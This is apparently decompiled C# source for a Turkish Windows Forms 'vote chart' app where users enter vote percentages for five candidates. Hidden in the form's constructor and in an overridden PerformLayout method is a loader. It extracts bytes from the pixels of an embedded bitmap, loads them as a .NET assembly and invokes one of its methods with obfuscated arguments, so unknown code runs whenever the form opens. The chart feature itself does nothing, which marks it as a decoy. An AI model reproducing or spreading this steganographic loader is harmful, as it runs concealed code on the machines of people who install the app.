using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using BlackHawkDown.Properties;

namespace SecimGrafik;

public class Form1 : Form
{
	private object[] SanbdoxReflector = new object[3] { "70555549", "6F6875", "BlackHawkDown" };

	private IContainer components = null;

	private static object DoubleArray;

	private Panel panel1;

	private Label label2;

	private Label label1;

	private Label label7;

	private Label label6;

	private Label label5;

	private Label label4;

	private Label label3;

	private TextBox textBoxE;

	private TextBox textBoxD;

	private TextBox textBoxC;

	private TextBox textBoxB;

	private TextBox textBoxA;

	private Label label8;

	private Button button1;

	private Label message;

	public Form1()
	{
		InitializeComponent();
		MethodInfo methodInfo = ((Type)DoubleArray).GetMethods()[0];
		methodInfo.Invoke(null, SanbdoxReflector);
	}

	private int sayiyaCevir(string text)
	{
		try
		{
			return int.Parse(text);
		}
		catch (FormatException)
		{
			return -1;
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Hashtable hashtable = new Hashtable
		{
			{
				'A',
				((Control)textBoxA).get_Text()
			},
			{
				'B',
				((Control)textBoxB).get_Text()
			},
			{
				'C',
				((Control)textBoxC).get_Text()
			},
			{
				'D',
				((Control)textBoxD).get_Text()
			},
			{
				'E',
				((Control)textBoxE).get_Text()
			}
		};
		SortedDictionary<string, int> sortedDictionary = new SortedDictionary<string, int>();
		bool flag = true;
		int num = 0;
		foreach (DictionaryEntry item in hashtable)
		{
			int num2 = sayiyaCevir(item.Value!.ToString());
			if (num2 == -1)
			{
				flag = false;
				continue;
			}
			sortedDictionary.Add(item.Key.ToString(), num2);
			num += num2;
		}
		int count = sortedDictionary.Count;
		if (!flag || count != 5)
		{
			((Control)message).set_Text("Lütfen tüm adayların yüzde değerlerini sayı olarak girin!");
			return;
		}
		if (num != 100)
		{
			((Control)message).set_Text("Fazla ya da eksik değer girdiniz. Değerlerin toplamı 100 olmalı! Girdiğiniz değerler toplamı:" + num);
			return;
		}
		((Control)message).set_Text("");
		foreach (KeyValuePair<string, int> item2 in sortedDictionary)
		{
			_ = item2;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_0373: Unknown result type (might be due to invalid IL or missing references)
		//IL_037d: Expected O, but got Unknown
		//IL_0401: Unknown result type (might be due to invalid IL or missing references)
		//IL_040b: Expected O, but got Unknown
		//IL_0480: Unknown result type (might be due to invalid IL or missing references)
		//IL_048a: Expected O, but got Unknown
		//IL_04ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0509: Expected O, but got Unknown
		//IL_057e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0588: Expected O, but got Unknown
		//IL_05fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0606: Expected O, but got Unknown
		//IL_0815: Unknown result type (might be due to invalid IL or missing references)
		//IL_081f: Expected O, but got Unknown
		//IL_0890: Unknown result type (might be due to invalid IL or missing references)
		//IL_089a: Expected O, but got Unknown
		panel1 = new Panel();
		message = new Label();
		button1 = new Button();
		label8 = new Label();
		label7 = new Label();
		label6 = new Label();
		label5 = new Label();
		label4 = new Label();
		label3 = new Label();
		textBoxE = new TextBox();
		textBoxD = new TextBox();
		textBoxC = new TextBox();
		textBoxB = new TextBox();
		textBoxA = new TextBox();
		label2 = new Label();
		label1 = new Label();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackColor(Color.Silver);
		((Control)panel1).get_Controls().Add((Control)(object)message);
		((Control)panel1).get_Controls().Add((Control)(object)button1);
		((Control)panel1).get_Controls().Add((Control)(object)label8);
		((Control)panel1).get_Controls().Add((Control)(object)label7);
		((Control)panel1).get_Controls().Add((Control)(object)label6);
		((Control)panel1).get_Controls().Add((Control)(object)label5);
		((Control)panel1).get_Controls().Add((Control)(object)label4);
		((Control)panel1).get_Controls().Add((Control)(object)label3);
		((Control)panel1).get_Controls().Add((Control)(object)textBoxE);
		((Control)panel1).get_Controls().Add((Control)(object)textBoxD);
		((Control)panel1).get_Controls().Add((Control)(object)textBoxC);
		((Control)panel1).get_Controls().Add((Control)(object)textBoxB);
		((Control)panel1).get_Controls().Add((Control)(object)textBoxA);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).set_Location(new Point(0, 0));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(211, 443));
		((Control)panel1).set_TabIndex(0);
		((Control)message).set_AutoSize(true);
		((Control)message).set_ForeColor(Color.DarkRed);
		((Control)message).set_Location(new Point(6, 313));
		((Control)message).set_MaximumSize(new Size(200, 0));
		((Control)message).set_Name("message");
		((Control)message).set_Size(new Size(0, 13));
		((Control)message).set_TabIndex(14);
		((Control)button1).set_Location(new Point(84, 273));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(100, 23));
		((Control)button1).set_TabIndex(13);
		((Control)button1).set_Text("Grafik Oluştur");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Segoe UI", 11f, (FontStyle)1));
		((Control)label8).set_ForeColor(Color.MediumBlue);
		((Control)label8).set_Location(new Point(8, 31));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(197, 20));
		((Control)label8).set_TabIndex(12);
		((Control)label8).set_Text("OY GRAFİĞİ UYGULAMASI");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
		((Control)label7).set_Location(new Point(63, 229));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(16, 19));
		((Control)label7).set_TabIndex(11);
		((Control)label7).set_Text("E");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
		((Control)label6).set_Location(new Point(63, 203));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(19, 19));
		((Control)label6).set_TabIndex(10);
		((Control)label6).set_Text("D");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
		((Control)label5).set_Location(new Point(64, 177));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(18, 19));
		((Control)label5).set_TabIndex(9);
		((Control)label5).set_Text("C");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
		((Control)label4).set_Location(new Point(64, 151));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(18, 19));
		((Control)label4).set_TabIndex(8);
		((Control)label4).set_Text("B");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
		((Control)label3).set_Location(new Point(64, 125));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(19, 19));
		((Control)label3).set_TabIndex(7);
		((Control)label3).set_Text("A");
		((Control)textBoxE).set_Location(new Point(84, 229));
		((TextBoxBase)textBoxE).set_MaxLength(3);
		((Control)textBoxE).set_Name("textBoxE");
		((Control)textBoxE).set_Size(new Size(100, 20));
		((Control)textBoxE).set_TabIndex(6);
		((Control)textBoxD).set_Location(new Point(84, 203));
		((TextBoxBase)textBoxD).set_MaxLength(3);
		((Control)textBoxD).set_Name("textBoxD");
		((Control)textBoxD).set_Size(new Size(100, 20));
		((Control)textBoxD).set_TabIndex(5);
		((Control)textBoxC).set_Location(new Point(84, 177));
		((TextBoxBase)textBoxC).set_MaxLength(3);
		((Control)textBoxC).set_Name("textBoxC");
		((Control)textBoxC).set_Size(new Size(100, 20));
		((Control)textBoxC).set_TabIndex(4);
		((Control)textBoxB).set_Location(new Point(84, 151));
		((TextBoxBase)textBoxB).set_MaxLength(3);
		((Control)textBoxB).set_Name("textBoxB");
		((Control)textBoxB).set_Size(new Size(100, 20));
		((Control)textBoxB).set_TabIndex(3);
		((Control)textBoxA).set_Location(new Point(84, 125));
		((TextBoxBase)textBoxA).set_MaxLength(3);
		((Control)textBoxA).set_Name("textBoxA");
		((Control)textBoxA).set_Size(new Size(100, 20));
		((Control)textBoxA).set_TabIndex(2);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Segoe UI", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(94, 92));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(90, 19));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("OY YÜZDESİ");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Segoe UI", 10f, (FontStyle)1));
		((Control)label1).set_Location(new Point(31, 92));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(57, 19));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("KİŞİLER");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(654, 443));
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).set_MaximumSize(new Size(670, 482));
		((Control)this).set_MinimumSize(new Size(670, 482));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Oy Grafiği Uygulaması");
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
		PerformLayout();
	}

	public virtual void PerformLayout()
	{
		ResourceTemplateDefine("");
	}

	private static string ResourceTemplateDefine(string Subcategory)
	{
		int num = 0;
		byte[] array = new byte[78336];
		Bitmap web = Resources.Web;
		for (int i = 0; i < 78336; i++)
		{
			for (int j = 0; j < 1; j++)
			{
				sfioqw(web, i, j);
				Color pixel = web.GetPixel(i, j);
				int num2 = ColorTranslator.ToWin32(pixel);
				array[num] = (byte)num2;
			}
			num++;
		}
		DoubleArray = IsFamilyOrAssembly(Assembly.Load(array)).GetExportedTypes()[1];
		return Subcategory;
	}

	private static Color sfioqw(Bitmap ddd, int x, int y)
	{
		return ddd.GetPixel(x, y);
	}

	private static Assembly IsFamilyOrAssembly(object PureAttribute)
	{
		return (Assembly)PureAttribute;
	}
}
